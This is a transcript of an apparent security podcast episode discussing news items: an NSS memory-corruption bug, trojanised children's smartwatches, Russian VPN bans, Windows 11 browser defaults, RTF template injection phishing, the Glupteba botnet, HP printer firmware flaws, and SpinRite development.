We're also going to look at the horrifying lack of security in something that I didn't know existed, Leo, smartwatches for children.



LEO:  Oh, yeah.  Oh, yeah.



STEVE:  And oh, bad idea.



LEO:  It's not just smartwatches.  We were talking about this on MacBreak Weekly, the Life 360 app that you put on your phone to track your kids and your family members.  Just a horrific privacy nightmare.



STEVE:  Well, and just wait till you hear how bad these things are.  We also have another six VPN services have been banned by Russia, and we get to say Roskomnadzor many times.  We also have Microsoft happily softening the glue between Windows 11 and Edge, so we have a bit of good news there.  But bad guys have found a new way of slipping malware into our machines.  There's a botnet using the bitcoin blockchain as its backup communications medium.  We have HP with more than 150 printer models in dire need of firmware updates, doubtless affecting some of our listeners.



I'm going to then briefly touch on a sci-fi note and update our listeners about SpinRite.  An interesting thing will be happening, maybe not tonight, but tomorrow for sure, which is to say as soon as I'm done with the podcast and have recovered.  And then we're going to look at this new research into an entirely new class of cross-site privacy breaches which affect every browser, mobile and desktop.  And as I said, a test everyone can run.  And I got a picture that was posted in the SpinRite development newsgroup yesterday that I immediately knew I had to share.  So Lorrie looked at it and said, "Is that yours?"  It's like, "No, honey, that's not.  But it's a dedicated tester."



LEO:  Let me queue up the Picture of the Week.



STEVE:  Okay.  So this is not something that we expect all of our testers to do.  Let me just make that clear.  Most people just boot a machine they have with a USB thumb drive and run the development release to see how it does and then report their results.  This individual is clearly a technician of some sort.  If you look, Leo, if you scroll down to the top of the next page, you'll see the SpinRite screen that he was seeing.



LEO:  Look at all the different devices.  



STEVE:  Yeah.  So he's got 13 drives hooked up to this system.  And there's little extra goodies that users will never see which are here for development.  You can see along the top it says 80, 81, 82, 83 up through 8C.  Those are the BIOS designations.  And  they're white because SpinRite was able to figure out which one of the drives that it has hardware access to the BIOS is referring to.  There's no, unfortunately, in the BIOS there's no way to associate BIOS designations with physical drive designations.  Yet SpinRite has to so that it's able not to confuse users by showing them a drive that the BIOS sees and that it sees.



So one of the challenges has been to create this association between the BIOS designations and the drives that SpinRite has direct hardware access to.  So you can see, for example, down at the bottom is 80, the fourth from the bottom.  That would be the drive that he booted from, a little 264MB thumb drive.  And then there's 8A, 8B, and 8C, which are other drives which are accessible only to the BIOS and not to SpinRite.  But anyway, oh, and then also there's a little cyan column down the right-hand edge of the drive identity.  That shows how many seconds it took for SpinRite to identify and qualify that drive for operation.



It performs a whole bunch of confidence testing, you know, gets the name, the serial number, all the smart data.  It also then performs a series of reads and writes in order to verify that it's able to do so.  When we were having IRQ problems, some of those tests would take a long time.  And so they'd sometimes say, you know, 26 seconds or something.  So that was another little clue that would allow us to know what was going on.



But in that first picture we see a little, looks like a Mini-ITX form factor motherboard, and drives just spread all over the table.  He actually numbered them.  You can see a little yellow column of numbers on that first image labeled 1 through 13.  And then he drew lines to show where all of these 13 drives are that are scattered around the table.  Anyway, it was just so unusual that I wanted to share it with our listeners.



LEO:  I really like this drive with the massive heat sink on it.



STEVE:  He made some, yeah, above and below it.  You can see it sandwiched between heat sinks, and he made some comment saying this used to run hot, but apparently...



LEO:  Not anymore.



STEVE:  Apparently not anymore.



LEO:  No, no, no.  Do-it-yourself heat sinks, I love it.



STEVE:  Just a fun little one-of-a-kind...



LEO:  What a crazy test bench.  Look at that.  Wow.



STEVE:  Yeah, and SpinRite found all the drives and is working correctly on all of those.



LEO:  Nice, nice.



STEVE:  So we're getting there.  I'll talk a little bit about the past week's adventure in a minute.  But Tavis found a bad bug in NSS.  Of course this is Tavis Ormandy at Google.  He's part of their zero-day group [Project Zero].  He discovered and quietly reported an important bug in Mozilla's widely used open-source NSS security suite.  Last Wednesday, with the bug quickly patched, Tavis tweeted, he said:  "This is a major memory corruption flaw in NSS.  Almost any use of NSS is affected.  The Mozilla advisory is here."  And he provided a link.  And then actually there's two links.  Twitter shortened one of them.



Anyway, NSS is used by Mozilla, of course.  It's the reason, for example, that Firefox sometimes behaves differently on Windows than other browsers because every other browser uses Windows' intrinsic security library that's built into Windows, whereas Firefox brings along its own.  And that's sort of a mixed blessing.  It means there's a lot more for them to maintain, but it does give them sort of more of their own containment and more portability.



But aside from just Mozilla, Red Hat, SUSE, and many other products also use NSS.  Of course Firefox, but also Thunderbird, SeaMonkey, and the Firefox OS.  There's the open-source client applications.  Evolution, Pidgin, Apache OpenOffice, and LibreOffice are also NSS clients.  Server products, as I mentioned, Red Hat, their Directory Server, their Certificate System, and the mod_nss SSL module for Apache is also NSS-based.  Over on the server side, Oracle is using NSS, including their Communications Messaging Server and Oracle Directory Server Enterprise Edition.  And as I mentioned, SUSE, their Linux Enterprise Server supports NSS, as does Apache.  So it's important, if there's something bad there.



In other locations, that is, other than Twitter, Tavis commented:  "If you're a vendor that distributes NSS in your products, you will most likely need to update or backport the patch.  Mozilla plans to produce a thorough list of affected APIs, but the summary is that any standard use of NSS is affected.  The bug is simple to reproduce and affects multiple platforms."  So in other words, anyone using NSS should focus less on worrying about which specific APIs are vulnerable.  I would just argue don't worry about that.  Just update your use of the security suite.  NSS versions prior to 3.73 or 3.68.1 in the ESR are vulnerable.  And that's all versions since October of 2012 until those releases.



Tavis said:  "We believe all versions of NSS since 3.14, which was released October 2012, are vulnerable."  However, for what it's worth, according to Mozilla, this vulnerability does not impact Firefox for whatever reason.  But all PDF viewers and email clients which use NSS for their signature verification are believed to be impacted.  That's where the problem is.  It's in the signature verification component.



Mozilla said:  "Applications using NSS for handling signatures encoded with CMS, S/MIME, PKCS 7, or PKCS 12 are likely to be impacted.  Applications using NSS for certificate validation or other TLS, X.509, OCSP, or CRL functionality may be impacted, depending upon how they configure NSS."  So just for the record, the exploitation of this during signature verification can lead to a heap-based buffer overflow when handling DER-encoded DSA or RSA-PSS signatures in email clients and PDF viewers.  The impact of successful heap overflow exploitation can range from a simple program crash to potentially arbitrary code execution, up through bypassing security software if code execution is achieved.  So again, if anyone is using NSS for some project, be sure to get an updated build.  So that's all of the past nine years of NSS, up until this was patched.  So essentially I'm sure anything anybody has been using until very recently when they just fixed it.



Okay.  I didn't know - you did, Leo.  But I didn't know that there was a thing such as cheap smartwatches for kids and babies.  To which we would have the refrain, what could possibly go wrong?  Dr.Web, which is an AV security firm based in Russia, recently examined four inexpensive smartwatches designed and marketed specifically for kids.  Now, before I go any further, allow me to just suggest to anyone listening to this podcast that, if they have that on their Christmas list, avoid any temptation whatsoever you might have to purchase a $50 smartwatch for anyone you know. 



Dr.Web's report is very detailed, so I'm not going to bother to describe what they found for each of the four devices.  But discussing a representative example will be informative and should be sufficient to forestall any desire anyone might have to put one of these little spyware beasties onto the wrist of anyone they know or care about.



So Dr.Web introduces the subject with a little bit of background which I've shortened a bit.  They wrote:  "Parents always strive to take care of their children.  Technology innovations help them reach this goal through various wearables like smartwatches and GPS trackers.  These devices are getting close to smartphones in functionality.  For example, many of them can track the child's location and travel route.  These devices can also make and answer phone and video calls, receive SMS and voicemail, take pictures, and listen to their surroundings.  It's even possible to enable the remote control of the device."  Okay, I don't know what that means.  But "Dr.Web has analyzed the potential threats that such gadgets can pose to parents and their children.



"During their daily operation," they wrote, "these devices collect and transmit data to the manufacturer's servers and make it available to parents through their personal accounts.  The information obtained with smartwatches is very sensitive.  If malicious actors get their hands over such information, it can put children in great danger.



"To understand the vulnerability and dangers of children's smartwatches, Dr.Web's specialists analyzed several popular models chosen based upon public popularity ratings and purposefully selected models from different price ranges.  We purchased all smartwatches anonymously from an online store.  We carried out both static and dynamic analysis during the inspection.  We searched for potential implants in the software and possible undocumented features, as well as checked network activity, transmitted data, and how it was secured."



Okay.  So one of the four devices they examined was the ELARI KidPhone 4G Smartwatch.  Yes.  And isn't it pretty, Leo.  I mean, it's beautiful.



LEO:  Just like Mommy and Daddy's.



STEVE:  Exactly.  Okay.  Get a load of that, this beautiful-looking device.  "Several versions," they wrote, "of the ELARI KidPhone 4G watches exist.  They're based on different hardware platforms, but they all run an Android OS, and their firmware differs slightly.  The primary threat of this model comes from its installed software.  Its firmware has a built-in app for over-the-air updating, and this app has trojan functionality.



"Firstly," they wrote, "the application sends the child's geolocation data to its own remote server.  Secondly, we found malicious code inside it, which is detected by Dr.Web" - remember these guys are AV people.  It's detected by their antiviral, antimalware technology as "Android.DownLoader.3894.  Every time the watch turns on or network connection changes, this code launches two malicious modules, Android.DownLoader.812.origin and Android.DownLoader.1049. origin.  They connect to the command-and-control server to transmit various information and to receive commands.  By default, the modules connect to the server once every eight hours.  Because of this, a long delay exists between the first connection and the first time the watch is turned on, thus reducing the chance of discovery.



"The Android.DownLoader.812.origin module sends the user's mobile phone number and SIM card information, geolocation data, and information about the device itself to the command-and-control server.  In response, it can receive commands to change the frequency of subsequent requests to the server; update the module; download, install, run, and uninstall apps; and load web pages.  The Android.DownLoader.1049.origin module sends SIM card information and mobile phone number information, geolocation data, a large number of data about the device and installed apps, as well as the info about the number of SMS, phone calls, and contacts in the phone book to this command-and-control server.  Thus Android.DownLoader.3894 hidden in this watch - that's that parent - can be used for cyber espionage, displaying ads, and installing unwanted or even malicious apps."



Okay.  Now you put the picture on the screen before.  I mean, which for me it's sort of disarming.  It's a consumer product.  And it's adorable and appealing-looking.  Our listeners who don't have video can't see what you and I are seeing, Leo, but they're very professional-looking, attractive consumer devices.  They look like toys, but they're definitely not.  Anyone who purchases one of these little devils is not only exposing their children to remote anonymous attackers and trackers, but also bringing an open microphone into the lives of those children's parents.  Who knows what might be overheard in what's presumed to be a private setting?  And who would be to blame?



Now, I fully recognize that the likelihood of any specific child or their parents being targeted through this is diminishingly low.  I don't mean to suggest otherwise.  But knowing what we now know, who would feel comfortable strapping one of those loose cannons onto their child's wrist?  And that's my point. The photo of these devices is utterly at odds with what's going on inside them.  It's deeply unsettling because they look so cute and harmless.  Yet inside that colorful soft plastic shell is a communicating computer running a trojanized Android OS which autonomously connects to a remote command-and-control server.



And Amazon sells these things.  The bullet points on Amazon's page says, under "Security and Peace of Mind for Parents:  Monitor child's location, set safe zones, and use remote audio monitoring through free parent-controlled app.  Get alert if the child uses the built-in SOS button."



Under "Easy Communication:  Stay in touch.  Have a 2-way voice call.  Use voice chat or send emojis.  Limit contacts to those authorized through the app to avoid undesired communication."  Under "User Friendly and Comfortable:  Kids phone watch features math game and interface with emoticons."  And then, finally, under "Other features:  Class time mode, alarm call, pedometer, up to 4 days standby time, ELARI SafeFamily free multilingual Android/iOS-compatible App, ability to add other ELARI smartwatch users to friends list."



So the watches that the Dr.Web researchers examined had default passwords of 123456, and most of them don't bother to employ encryption in their communications.  They just use plaintext.  What this brings to mind is the glaring gap in consumer protection that currently exists in our tech industry because the difference between purchasing a well-designed WiFi router that might still have an inadvertent security vulnerability and this colorful plastic child's watch that communicates without encryption with remotely located command-and-control servers, continually sending back all of the child's movements, and is able to autonomously download any additional software at any time to me seems extreme.  I mean, it takes the consumerness way down to sort of a different lower level.



And who knows what they're doing?  In the U.S., the engineers and scientists at Underwriters Labs are able to test toasters and vacuum cleaners because they're able to carefully examine and stress test the important functional safety aspects of those consumer products.  But today's tech gadgets are closed black boxes which are actively hostile to reverse engineering.  I don't see any solution to this mess other than to take every possible precaution.  We're able to place our IoT devices on their own segmented network.  If these wristwatches also have WiFi radios, placing them on the IoT WiFi would help.  But they can still spy.



LEO:  Well, yeah, and the whole point of this is to follow your kid when they're out and about, not in the home network.



STEVE:  Right.  Right, exactly.  And so to me I just - I would stay as far away from this ELARI brand as possible.  And I guess the only advice I would have, I mean, I could imagine, as you listen to these bullet points, these seem like cool things.



LEO:  Yeah, with the kind of features you'd want in a watch that's tracking your child.



STEVE:  Yeah, but use Garmin, or use...



LEO:  Yeah, use an American company to begin with, I would say, yeah.



STEVE:  Yes.



LEO:  Apple has watches that do all of this, probably at a much higher price.  But they're available.  



STEVE:  Yeah.  I just got a chill when I looked at these beautiful-looking consumer devices for 50 bucks.  And imagine - and we know how much kids like to emulate their parents; right?  So I'm sure Johnny would love to have a watch like Daddy has.



LEO:  Right.  Well, Daddy may even want Johnny to have these capabilities.  That's the thing.  Daddy and Mommy want to track the kids.



STEVE:  Right.



LEO:  The problem is who else is doing it?



STEVE:  Right.



LEO:  You're going to turn on all those features because that's why you bought the watch.



STEVE:  Is there a really low-end Apple iPhone?



LEO:  No.  There's an Apple Watch SE that they make that you can configure for kids, and that's probably the way to go.  But it's a few hundred bucks.  It's not cheap cheap.



STEVE:  Yeah.  Again, to all of our listeners, buyer beware.  If you want this, I'd go Apple.



LEO:  Yeah, I agree.



STEVE:  We know that it will be as well-designed as it can be.  I just don't know how you do, I mean, maybe Samsung.  Maybe another, some other high-end Android device.  Or what about any of the Garmin-y sorts of things?



LEO:  Yeah, yeah.



STEVE:  Do any of the activity trackers do locations?



LEO:  Problem is there a lot of kids' trackers in this category because they're inexpensive.  You don't want to give a kid a $300 watch.



STEVE:  No.



LEO:  They're small.  They're built for kids.  Their functionality is considerably more limited because parents don't want kids making random phone calls, either.



STEVE:  Right.



LEO:  So there are - this is a...



STEVE:  Look at all the spam we get in our phones.  You don't want your kid answering the phone, like some random stranger in lord only knows where.



LEO:  Exactly.  "Hello?"  "Hey, how's your auto warranty?"  "What?"  Yeah, that could be a problem.



STEVE:  Anyway, I just - for me this was a wakeup call, and I wanted to share it because, boy.  However bad you think it could possibly be, this suggests it's a lot worse than that.  The people selling this just don't give a crap about security or privacy, and you don't want to strap that on to any child's wrist under any circumstances.



Last Thursday, speaking of Russia, Russia's Internet policing agency Roskomnadzor announced the ban of an additional six VPN services, bringing now the total number of banned VPN providers to 15.  The most recent six bannings were Betternet, Lantern, X-VPN, Cloudflare WARP, Tachyon VPN, and Private Tunnel.  Roskomnadzor sent a request to inform the Center for Monitoring and Control of the Public Communications Network about the removal of those additional six services from the systems of all registered Russian companies and public organizations.  They can no longer be used.



So the list of banned services now reads:  Hola VPN, ExpressVPN, KeepSolid VPN Unlimited, Nord VPN, Speedify VPN, IPVanish VPN, VyprVPN, Opera VPN, and ProtonVPN, to which we add those other six.  These services collectively have all been banned due to their principled refusal to abide by Roskomnadzor's demands to connect their systems to the FGIS database because doing so would defeat the entire purpose of using a VPN connection, which is - that purpose is to bypass access restrictions and obtain anonymity, which is a level of individual freedom which apparently makes Russia's leaders uncomfortable.



Back in 2019 Russian authorities gave all VPN vendors operating in-country the ultimatum to comply with their rules, or else be banned.  The only vendor who responded positively before the deadline was, I guess not surprisingly, the Moscow-based Kaspersky with their Secure Connection product.  They were already the VPN in-country, so they had nothing, you know, they didn't have to change anything.  The non-complying VPN vendors either established new servers just outside the Russian borders or attempted to employ traffic masking techniques which are known to work well against the Great Firewall of China.  But the Russian authorities gradually caught up with those services also which were trying to bypass the new regulation and have banned them in multiple action rounds.



As Russian users uninstall banned products and turn to what few remaining products remain, Russian authorities evaluate which ones have then emerged as the most popular and add them to the growing block list.  So if you're in Russia, good luck.  It's going to be very difficult for you to have private and secure communications.  Or you aren't going to be able to use one of these mainstream high-profile VPNs.  I'm sure there are ways around this that people inside of Russia are aware of.  And Leo, I'm aware of my need to take a sip.



LEO:  Okay.  You like our holiday dcor, by the way?  It's all...



STEVE:  Oh, it's very nice, yes.  I like it.  You've got a sock on the door behind you, a stocking, I think.



LEO:  Yes.  There's a stocking.  There's a couple of stockings.



STEVE:  And we have some poinsettias, I see, very nice.



LEO:  Yes.  And, yeah, one of the stockings is for Ozzie.  One of them is an Angry Bird stocking.  You'll notice that the Mr. Robot mask has an elf hat on.  Very festive.



STEVE:  Yes, very nice.  Very festive.  I think you should keep that.  That looks good.



LEO:  It looks good on him, doesn't it.



STEVE:  Yeah.  That ought to...



LEO:  No, I actually like this time of year.  I look forward to it all year long.  You'll be getting your TWiT Christmas card soon with - it's the meta version of our Christmas card.



STEVE:  You've been talking about it.  I'm looking forward to seeing it.



LEO:  It's going to be - I think you're going to enjoy it.  We're all virtual.



STEVE:  Cool.



LEO:  Back to you, Steve.



STEVE:  So Windows 11 has loosened its grip on Edge.



LEO:  Oh, thank god.



STEVE:  Yes.  I know.



LEO:  Still doesn't convince me.



STEVE:  I know.  Last week's Windows Weekly was a bit depressing listening to Paul and Mary Jo holding Microsoft to account for many of the choices Microsoft has made for the behavior under Windows 11.  Among other things, Microsoft is clearly turning Edge from its original clean user-benefiting browser into another Microsoft profit center.  And then adding insult to injury is having Windows 11 actively fighting its users' desire to switch away from Edge to any other browser.



Now, in fairness, we've probably all seen Chrome promoting itself whenever it has the chance.  At least I do.  Firefox is still the browser that handles my URLs by default, and I'll manually often launch Chrome and use it.  Oftentimes Chrome notices that it's not the default and gives me some grief for that fact.  But it's like, sorry, I like Firefox's down the left-hand column vertically oriented tabs much better than - and I've used Edge's too.  I turn that on.  And still Firefox is my go-to browser.



And it's annoying that there's no obvious way to tell Chrome that things are already just the way I want them to be, thank you very much.  But now that Microsoft is pushing the adoption of Edge quite hard, we're seeing the same from them.  BleepingComputer located the key in the Windows registry which contains the contents of the various pop-up messages that Microsoft has prepared for Edge.  There are five currently.  First one that may pop up reads "Microsoft Edge runs on the same technology as Chrome, with the added trust of Microsoft.  Browse securely now."  Okay.  I don't know what that means.



LEO:  Yeah, mm-hmm.



STEVE:  Or get this one:  "That browser is so 2008!  Do you know what's new?  Microsoft Edge."



LEO:  Ooh, I want to be with the hip kids.  Woohoo.



STEVE:  "Come to the future."



LEO:  Please.



STEVE:  Okay.  Number three:  "Looking for speed and reliability?  Microsoft Edge is the only browser optimized for Windows 10."  What?  "Try a faster browser today."  Okay.  How about number four?  "'I hate saving money,' said no one ever."



LEO:  That's because they're building in buy now, pay later and type one searches.



STEVE:  I know.  I know.



LEO:  All this crap.



STEVE:  "'I hate saving money,' said no one ever.  Microsoft Edge is the best browser for online shopping.  Shop smarter now."  Oh, Leo.  And finally:  "Microsoft Edge is fast, secure, and the browser recommended by Microsoft."



LEO:  Hello.



STEVE:  "Discover more benefits.  Learn more about Microsoft Edge."  Now, BleepingComputer has been unable to trigger some of - I think they've only been able to see two of these five.  But those are in there, waiting to spring out.



LEO:  It's so annoying because it gets triggered when you try to download Chrome, when you go to Chrome, when you, I mean, anything you do, Microsoft feels the necessity to nudge you and say, oh, no, no, no.  You want Edge.



STEVE:  Yeah, now, there are therapists that could help with this form of insecurity.



LEO:  Yes.  



STEVE:  Okay.  In any event, I've already very clearly articulated my feelings about Windows 11, and I'm feeling quite confident that none of my hardware will run on it.  So I'm good.  It's like, sorry, you can't run Windows 11.  Fine.  That's the right outcome for me.  Anyway, I've been shying away from any further kicking of that dog.



But in fairness I wanted to mention a bit of balancing good news that I imagine Paul will also be noting tomorrow:  The way things were originally set up in Windows 11 is that Microsoft had eliminated the simple ability of the user to change their system's default browser by removing the UI option to do so.  Instead, they granularized the web browser's handling settings by file type - like .htm, .html, .pdf, and so on - and by protocol - HTTP, HTTPS.  And so you had to specify which browser would handle all of those things individually.  And they buried all of those options deep in the registry.  This forced any determined Windows 11 users to search through the registry, extension by extension and protocol by protocol, to manually change each one in order to unhook Edge.



Happily, with last week's release of the Windows 11 Insider build 22509, Microsoft has restored the presence of a single "Set Default" button, and has also surfaced all of those individual file and protocol types in the UI.  So a non-Edge browser can now be set as default easily.  And then, if desired for some reason, other browsers can override that default for specific file type and protocols.  So good on Microsoft for listening to users.  I mean, they'd have to be really deaf not to have heard the outcry over how difficult they had made it not to use Edge under Windows 11.  So I just wanted to acknowledge that they had.



Okay.  Also on the Microsoft side, the earliest Windows had the clean and simple Notepad app which was useful for displaying and editing unformatted and unformattable text files.  I still use Notepad every day.  It's just right there.  No B.S.  When I want to take line wraps out of a block of text, Notepad.  And I like Notepad++, just to prevent everyone from telling me about it.  I know about it.  I have it.  I love it.  It's annoying that it's constantly updating itself, which is like, would those guys just please leave it alone?  But no.  Anyway, Notepad is there.  It  was implemented as a very lightweight UI around a simple Windows textbox container.  Basically it's a control, a UI control widget with a little bit of load and save UI around it.



But Windows also offered WordPad, right from the beginning, which allowed for a richer textual formatting experience.  It was possible to set the text color, the size, and treatment, such as bolding and italics and so forth, and the text alignment.  And just as Notepad was a UI wrapped around the Windows textbox container, WordPad's richer textual formatting experience was a UI wrapped around the Windows Rich Text Format (RTF) container.  I've long been a fan of Windows' RTF control, and anyone who's ever used any of my Windows software will have seen its embedded pages with some text formatting.  That's what I use.  I like being able to set some colors and alignment and font sizes and things.  All of that in my apps are RTF controls.



Okay.  In any event, unlike Notepad, the RTF container can also contain embedded things.  It can be a host for OLE, the original Object Linking and Embedding objects, because why not?  One of the many features of this embedding is the use of so-called formatting templates which can be loaded on the fly from a file.  And wouldn't you know it, malware deployers have figured out that these RTF embeddable template objects will also accept URLs.  Oh, lord.  In other words, not just loading them with something local, loading them with something from anywhere in the world.  Sounds like a terrifically flexible feature.  What could possibly go wrong?



Well, how about three different state-sponsored threat actors aligned with China, India, and Russia, all now having been observed adopting this RTF template injection, as it's now being called, as part of their new phishing campaigns to deliver malware into targeted systems.



Researchers at Proofpoint have published the results of their research under the title "Injection Is the New Black:  Novel RTF Template Injection Technique Poised for Widespread Adoption Beyond APT Actors."  They said:  "Proofpoint threat researchers have observed the adoption of a novel and easily implemented phishing technique by APT [Advanced Persistent Threat] actors in Q2 and Q3 of 2021.  This technique, referred to as RTF template injection, leverages the legitimate RTF template functionality.  It subverts the plain text document formatting properties of an RTF file and allows the retrieval of a URL resource instead of a file resource via an RTF's template control word capability.  This enables a threat actor to replace a legitimate file destination with a URL from which a remote payload may be retrieved.



"The sample RTF template injection files analyzed for this publication currently have a lower detection rate by public AV engines when compared to the well-known Office-based template injection technique."  In other words, this has been adopted because it slips under the radar at this point.  "Proofpoint has identified distinct phishing campaigns utilizing the template which have been attributed to a diverse set of Advanced Persistent Threat actors in the wild.  While this technique appears to be making the rounds among APT actors in several nations, Proofpoint assesses with moderate confidence, based on the recent rise in its usage and the triviality of its implementation, that it could soon be adopted by other cybercriminals, as well."



They wrote:  "RTF template injection is a simple technique in which an RTF file containing decoy content can be altered to allow for the retrieval of content hosted at an external URL upon opening an RTF file.  By altering an RTF file's document formatting properties, specifically the document formatting control word '\*\template' structure, actors can weaponize an RTF file to retrieve remote content by specifying a URL resource instead of an accessible local file resource destination."  And they go on at some length to explain this more clearly.



So anyway, we know the tune pretty well.  Once again, an arguably unnecessary and seldom, if ever, used feature of RTF containers has been found to be exploitable by attackers and is now being used with growing popularity.  As Proofpoint suggests, it's too easy to use and too powerful not to become much more widely adopted.  I guess what we could hope is that all of the AV scanners and Windows Defender and other tools which are currently not seeing this abuse will be quickly updated in order to catch it.



We have an instance of a malicious botnet using the bitcoin blockchain.  Get a load of this one.  A botnet which Google says has infected more than one million Windows machines globally and continues to infect new machines at a rate of thousands more per day is using the public bitcoin blockchain to stay in touch.



Google is suing a pair of Russian individuals it claims are behind this sophisticated botnet operation.  In a complaint filed in the U.S. District Court for the Southern District of New York, Google names Russian nationals Dmitry Starovikov and Alexander Filippov as the two main operators of the Glupteba botnet, citing Gmail and Google Workspace accounts they allegedly created to help them operate the criminal enterprise.



Google claims the defendants used the botnet network - which it describes as a "modern, borderless technological embodiment of organized crime" - for illicit purposes, including the theft and unauthorized use of Google users' logins and account information.  Google is demanding that Dmitry and Alexander pay damages and are permanently banned from using Google services.



According to Google, the Glupteba [G-L-U-P-T-E-B-A], I guess that's Glupteba botnet...



LEO:  Glupteba, think you got it, yup.



STEVE:  ...which Google has been tracking since last year in 2020, has so far infected approximately one million Windows machines worldwide and is growing at a rate, as I said, of a few thousand new machines a day.  Once a device has been infected, typically by tricking users into downloading malware via third party "free download" sites, the botnet steals user credentials and data, secretly mines cryptocurrencies, and sets up proxies to funnel other people's Internet traffic through the infected machines and routers.  In its complaint Google says:  "At any moment, the power of the Glupteba botnet could be used in a powerful ransomware attack or distributed denial of service."  Google also noted that the Glupteba botnet stands out compared to conventional botnets due to its technical sophistication and use of blockchain technology to protect itself from disruption.



As well as launching the litigation against the so-called Glupteba botnet, the company's Threat Analysis Group, that TAG team, which has observed the botnet targeting victims in the U.S., India, Brazil, Vietnam, and South Asia, announced it has worked with Internet hosting providers to disrupt the botnet's key command-and-control infrastructure.  This means its operators no longer have control of the botnet, though Google has warned that Glupteba could return due to the fact it uses blockchain technology as a resiliency mechanism.



Google explained that "The Glupteba botnet does not rely solely on predetermined web domains to ensure its survival.  Instead, when the botnet's C&C server is interrupted, the Glupteba malware is hard-coded to search the public bitcoin blockchain for transactions involving three specific bitcoin addresses that are controlled by the Glupteba enterprise.  Thus the Glupteba botnet cannot be eradicated entirely without neutralizing its blockchain-based infrastructure."



Which I thought was quite clever.  So presumably the bad guys, if they lose control of the command-and-control servers, they're able to create transactions which post to the blockchain.  The blockchain, of course, records the signatures of the entities that are posting transactions there.  The bots then look there and pick up their instructions from details of the transaction.  So where there's a will, there's a way.  And obviously unfortunately there's a lot of will here.



HP has been shipping vulnerable printers for the past eight  years.  The guys over at F-Secure carefully examined one HP printer.  It was an M725z multifunction device, MFP. 



But once they reported their findings to HP at the end of April, HP found that their use of common firmware across printers meant that at least 150 other printer models were also affected across the LaserJet, PageWide, and ScanJet families.  Updated firmware has been available from HP since November 1st, so anyone having any HP printer, who might be a target of either inside or outside attack, will definitely wish to update all of their HP printers' firmware.



The first of the two problems, tracked as CVE-2021-39238 with a CVSS rating of 9.3, describes a vulnerability that can be used to create wormable exploits that can self-replicate and spread to other HP printers inside internal networks or over the Internet.  The trouble is particularly worrisome because it's a buffer overflow in the printer's font parser.  So just causing a vulnerable printer to print a specially crafted page or PDF could take over the printer.  The F-Secure researchers said that the flaw can be exploited to gain control over a printer's firmware to steal data or assemble devices into botnets, all while leaving little evidence of exploitation behind, presumably just operating in RAM.



They also indicated that attacks that abuse the vulnerability in various other ways, such as attacking Internet-exposed devices or by loading the exploit code on a website or inside an ad, can also be successful.  Users on corporate networks, or those who view the ad, will have the code reach out to ports on their internal network to exploit local printers.  Wow.



The second vulnerability is a local physical USB port attack being tracked as CVE-2021-39237, which impacts the printer's communications board.  Fortunately, this bug can only be exploited with physical access to a vulnerable device, and an attack takes up to five minutes to execute, compared to the first one, which only takes a few seconds.  On the other hand, if you've got printers with exposed USB ports, that's an inside job attack.  In a very large corporation where you've got a disgruntled employee, or maybe they've been subverted by an outside entity, you know, hey, we'll pay you $10,000 if you insert this USB stick into one of your company's printers and walk away, wipe off any fingerprints, that would be a model that could also be successful.



So as I said, if your enterprise uses HP printers, which are still the world's number one printer by market share, do make some time to update the firmware throughout your organization.  Again, it's been available since November.



Okay.  Just a quick touch on sci-fi.  My nephew is going nuts over Ryk Brown's latest novel.



LEO:  How old is your nephew?  Is he 10?  Is he 30?



STEVE:  No, no, no, he's one of the top performers at Salesforce.



LEO:  Okay.  Got it.  Okay.  So he's a grownup.  Well, that makes a difference.  If a 10-year-old says they love Ryk Brown, okay, I'm going to take that like a 10 year old would like it.  But he's a grownup, yeah.



STEVE:  Okay.  I'm more than twice his age.



LEO:  Okay.



STEVE:  And I can't wait.  Anyway, he keeps texting me in all caps that the new novel is SO GOOD.



LEO:  Now, we've read Ryk Brown before.  This is not a new name.



STEVE:  Oh, yeah, yeah, yeah.  Yes, yes, yes.  It's spelled R-Y-K.  This is that Frontiers Saga.



LEO:  Is this Frontiers?  Oh, it is.  Oh, okay.



STEVE:  Yes.  This is the 31st book.  And I know that John is up to speed.  He's probably already read this 31st book.  Anyway, I will get there.  My nephew is making me drool for this book.  But I'm going to go do the Bobiverse first in honor of all of our listeners who have said, Steve, you know, check it out.



LEO:  Frontiers, the Frontiers Saga is kind of one of those space battle-type sci-fi books; right?  A lot of laser fire and things.



STEVE:  It is.  But what it is is it's character driven.



LEO:  Oh, good.  Okay.



STEVE:  It is so well, I mean, in fact I have here in my show notes, I said:  "Ryk Brown's latest novel, which presumably details the continuing adventures of Nathan, Cameron, Jessica, Vladimir, Telles, Josh, Loki and all the rest of the wonderfully articulated characters that Ryk has created."  I mean, that's really what it is.  It's so well done because you really get to know these people.  And it's an interesting, you know, the best sci-fi is about the characters, but it also creates some interesting and engaging new technology.



So, and this isn't giving anything away.  This is set in the far future, after the Earth and a number of its neighboring settled planets are recovering from the so-called Bio-Digital Plague.  And that's never - Ryk never goes into great detail about it, but it's something, it was some sort of a digital virus that crossed over into the biosphere and almost wiped out humanity, not only on Earth, but everywhere it was able to travel.  And a bunch of colony ships went out that were ahead of this bio-digital plague, and so humanity dispersed through the universe.  So now we're in the process of getting ourselves, pulling ourselves back up by our bootstraps.



What was discovered in the Swiss Alps was an archive of all the stored human knowledge from pre-plague time which was locked up so the bio-digital plague couldn't get in.  And so a new drive technology called the so-called "jump drive" allows us to jump a great distance instantly.  And an accident which occurs at the very start of the first book, which is why this is not a spoiler, has surprising consequences.



And anyway, I was glad to see some reference elsewhere to it being one of the most popular science fiction space operas of all time.  So it's not just me.  I didn't have sort of calibration.  But it is just - and I've read the whole 30 books twice now.  And I'm finishing up 30, then I'm going to switch to the Bobiverse.  But it's just, it's not going to change you.  But if you just enjoy really well-done adventures, it is definitely that.



LEO:  Nice.



STEVE:  Okay.  So that heuristic hardware interrupt handling solution that I mentioned last week which I developed for SpinRite appears to have solved a number of current and doubtless future troubles.  As I've mentioned, I take every single problem that our testers can find absolutely seriously because I learned a long time ago, if it happens to one person, it'll happen to a hundred.



So thanks to additional feedback from our testers, and my hours of staring at code, and then a number of additional tests and incremental improvements, you know, up in the very far right corner of that screen shot it said "Development Release 7F."  And so we had 7, and then we quickly had A, B, C, D, E, F because they didn't feel like they were big enough to jump to 8, but I kept hoping I was going to hit the magic solution for whatever problem I was trying to track down.  So we've had a bunch of tests and incremental improvements.



